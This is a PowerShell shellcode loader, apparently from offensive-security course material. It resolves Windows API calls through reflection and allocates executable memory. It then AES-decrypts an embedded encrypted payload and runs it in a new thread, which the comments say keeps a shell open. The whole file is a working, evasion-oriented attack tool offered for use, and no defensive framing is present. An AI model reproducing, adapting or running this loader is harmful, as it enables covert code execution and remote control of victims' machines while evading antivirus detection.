function LookupFunc {
    Param (
        $moduleName, 
        $functionName
    )
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    # Creates our assembly and defines the module and type
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    
    # Sets up the constructor
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
    # Sets up the invoke method
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    # Done
    return $type.CreateType()
}

function Decrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 128
    $aes.BlockSize = 128

    # Keep this in mind when you view your decrypted content as the size will likely be different
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros

    $aes.key = $Key
    $aes.IV = $IV

    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
    $aes.Dispose()
    return $decrypted
}

# Allocate our memory buffer
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Encrypted Payload
[Byte[]]$Offsec = 
0xb0,0xc9,0x14,0xa8,0xdb,0xb2,0xfe,0xd7,0x6d,0x5d,0x9e,0x3b,0xd1,0xd0,0x9a,
0xb0,0x5f,0x6e,0x41,0x5c,0x39,0x30,0xe1,0x3a,0xfb,0x6f,0x1c,0xdd,0x40,0x8a,
0x92,0xcb,0x63,0x55,0x65,0x2c,0x2c,0x4e,0xaf,0xd9,0xa6,0xcf,0xbf,0xef,0x72,
0x7f,0x95,0xa8,0xc5,0x49,0x42,0x81,0xdb,0xd7,0xea,0x4f,0xf6,0xf7,0x37,0x31,
0x24,0x08,0x77,0x9d,0xae,0x99,0xc4,0xa8,0x0f,0x89,0xf5,0x4a,0x4f,0xb4,0x5a,
0x43,0x3f,0x0b,0x59,0x5a,0xed,0xed,0xef,0x97,0x72,0x66,0xc9,0x89,0x09,0x53,
0x1f,0x5f,0x07,0x05,0x30,0x02,0x27,0x52,0x74,0x2b,0x68,0xb4,0xfb,0x70,0x63,
0x84,0x1f,0x9a,0x3d,0xfa,0xaf,0xea,0x8b,0xfa,0xe6,0x10,0x9b,0x9a,0x9a,0x63,
0xfb,0x42,0x72,0x56,0xbb,0xe5,0xd2,0x18,0xa1,0xb5,0xff,0xc7,0x5c,0x98,0x4c,
0xab,0xf5,0xb6,0x54,0x92,0xf1,0x13,0x1b,0x5d,0x5a,0x1a,0xc3,0xc6,0xad,0x2a,
0x56,0xa7,0x95,0x08,0xca,0x6a,0x02,0xc0,0xe1,0xa2,0x4a,0xf3,0x16,0xc4,0xde,
0xc6,0xdb,0x7f,0xc3,0x0e,0xa2,0x2b,0x22,0x39,0x55,0x57,0x5c,0x95,0xd8,0x53,
0xe5,0xb8,0x45,0xed,0x1b,0x19,0x9b,0x8e,0xa5,0x8f,0x2a,0xf7,0x3c,0x2f,0x3e,
0x1e,0x4f,0xd6,0x11,0x0f,0xa9,0xef,0xac,0x28,0xb3,0x66,0x5f,0x65,0xb4,0xa1,
0x82,0xc4,0xe4,0xf1,0x97,0xe5,0x92,0xb5,0xf7,0xa5,0xd1,0xa5,0x47,0x7e,0x15,
0x02,0xdd,0x22,0x3e,0x7e,0xa1,0x46,0x91,0x59,0xfc,0x29,0x5d,0x0c,0xbf,0xeb,
0x6d,0x7c,0x97,0xce,0x15,0xe4,0xbc,0x22,0xb6,0x02,0xa8,0xc6,0x57,0xc2,0x2a,
0x02,0x62,0x50,0xe0,0xd6,0x9f,0x9e,0xd2,0xf3,0x1a,0x52,0x05,0x08,0x37,0x10,
0x7d,0x2a,0x8e,0x6d,0x8f,0x61,0xca,0x07,0xdf,0xba,0x89,0xe0,0x79,0x79,0x65,
0xe7,0x89,0x43,0x97,0xe6,0x2f,0xc4,0x9a,0x2b,0x63,0x60,0x85,0xc1,0x9d,0xeb,
0x7e,0xe2,0xdc,0x08,0x90,0x21,0xa4,0xef,0x31,0x73,0x31,0x67,0xfc,0x97,0xf1,
0xce,0x7b,0x68,0x14,0x11,0x15,0xbc,0xa3,0xe1,0xd5,0x25,0x4b,0x7c,0x94,0x05,
0x0b,0x20,0x58,0x07,0xde,0x8a,0xe6,0x7d,0xe7,0x56,0xc0,0x2b,0x5e,0x63,0xac,
0xb2,0x42,0x1d,0x88,0x87,0x84,0x01,0xcb,0x95,0xa1,0xcb,0x9b,0x26,0x2c,0xa7,
0x1c,0x36,0xe6,0x0d,0x98,0xeb,0xfe,0x65,0x4d,0xca,0x54,0xf8,0x89,0x52,0xfc,
0x69,0xba,0x42,0xbf,0xd6,0x63,0xf5,0x36,0x89,0x65,0xd3,0xa4,0x8f,0xd8,0x7a,
0x10,0x7a,0x03,0x6e,0xa0,0x8f,0xcc,0xf1,0xef,0x77,0xe7,0x9d,0x2a,0x56,0xcd,
0x89,0xd3,0x50,0x49,0x00,0xf2,0x66,0x2c,0xc7,0x6b,0x03,0x5c,0xcf,0x26,0xc5,
0xeb,0xe3,0x5b,0xb8,0xac,0x52,0x6a,0x89,0x2f,0xff,0xf0,0xac,0x9a,0xcc,0xb9,
0xff,0x3a,0xcd,0x38,0x92,0xe3,0xee,0x38,0x01,0x46,0x17,0xc6,0x69,0xff,0x1c,
0xe7,0x7c,0xe2,0x00,0x92,0xdc,0x5f,0x8f,0xfd,0x67,0xa9,0xf7,0x8c,0xe2,0xd1,
0x75,0x2c,0x13,0xca,0xca,0x37,0x2d,0xf0,0xd5,0x3f,0xaf,0x77,0x83,0xdb,0x2c,
0x7c,0x5e,0x12,0x81,0x5e,0xaf,0xfa,0x1e,0x55,0xbb,0xd2,0xc7,0x3c,0xbb,0x75,
0x6a,0xd2,0x2a,0x3d,0xde,0x0d,0xfb,0xdf,0x7e,0x91,0x1e,0x00,0x00,0x65,0x0b,
0x96,0x8c,0x69,0x19,0x24,0x3d,0x1b,0xed,0x14,0x72,0x7f,0xfa,0x5a,0x6f,0xed,
0x35,0xba,0x96,0x53,0x3e,0xb1,0xdf,0xd7,0xe4,0x0f,0xf1,0x38,0x2f,0xde,0x6a,
0xb1,0x4b,0x52,0xdb,0x98,0x7b,0x7c,0xc6,0xf1,0x96,0xff,0x0b,0x01,0x40,0x40,
0x58,0x7b,0x9b,0xbe,0x80,0xdc,0x07,0x7a,0x17,0x81,0x5f,0x34,0xad,0x1e,0x9d,
0x2f,0x16,0x73,0xf2,0xb8,0xfc,0x33,0xdb,0x2e,0x19,0x94,0x00,0xab,0xd4,0x31,
0xab,0x31,0x9e,0xbb,0x1e,0x9a,0x80,0x67,0x7b,0x92,0xcf,0x72,0x35,0x21,0xcd,
0xae,0xbd,0x62,0x25,0x77,0xf7,0xdf,0x18,0xf4,0x0f,0x27,0x3b,0xe1,0xaf,0xbb,
0x1c,0x01,0x3d,0xe1,0x17,0x93,0x53,0xdf,0x8a,0xa1,0xe3,0xa8,0x1f,0x27,0x0c,
0x34,0x29,0xdf,0x05,0xaf,0x2e,0x90,0x4d,0x6d,0x9e,0xd1,0x47,0xdc,0xf0,0xea,
0xec,0xdd,0x67,0xbb,0xec,0x19,0x18,0xb6,0x37,0xea,0x2c,0xe5,0x77,0x82,0xb4,
0xde,0xb5,0x8c,0xac,0xea,0xb6,0x95,0xdd,0x36,0x99,0x31,0xb6,0xad,0xc9,0x67,
0x09,0x5f,0xa2,0xff,0xa8,0x5c,0xfd,0x04,0x4c,0x24,0xb9,0x83,0x97,0x46,0x7c,
0x8f,0xbd,0x00,0x36,0x58,0x9e,0x96,0x3d,0x8f,0xc0,0x4b,0x3a,0x90,0xdc,0x3f,
0x5b,0xb4,0x8e,0x30,0x5d,0x62,0xdb,0x20,0x32,0x74,0x0f,0xa2,0x6a,0x95,0xb1,
0x2e,0x18,0x36,0x61,0x2a,0x69,0x96,0xe3,0x68,0x43,0x33,0x44,0x82,0x26,0x19,
0xce,0x9c,0x76,0x08,0x9b,0xc9,0xef,0xa5,0x1f,0xaa,0x41,0xe6,0xbb,0x1a,0x36,
0x56,0x32,0xba,0x12,0xb3,0xe3,0x71,0x5f,0xa9,0xd6,0xf7,0x1c,0x8f,0x92,0x56,
0x2c,0x87,0x3b,0xc0,0xd3,0x53,0x00,0x46,0x50,0x76,0x29,0x07,0x7b,0x56,0x0a,
0x1a,0x5d,0x23,0xf3

# Key
[Byte[]]$Says = 
0x9a,0x12,0x62,0xf3,0x6b,0xe9,0x69,0x40,0x9c,0xc0,0x7f,0x1f,0xbd,0x62,0xe0,
0x36,0x51,0x6e,0xca,0x03,0xea,0x8d,0xa5,0xf1,0x64,0x36,0x43,0x9b,0x2f,0xa8,
0xcc,0xe6

# IV
[Byte[]]$TryHarder = 
0xdd,0xa9,0x4f,0x7c,0x16,0x09,0xee,0x90,0x57,0xb8,0xfb,0xb3,0x16,0x38,0x4e,
0xf0

# Decrypt our shellcode
$buf = Decrypt-Bytes -Bytes $Offsec -Key $Says -IV $TryHarder

# Copy our shellcode into the buffer
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Create an execution thread using the instructions at the memory address of our shellcode
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Execute our thread and ensure it doesn't exit until we close our shell
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)   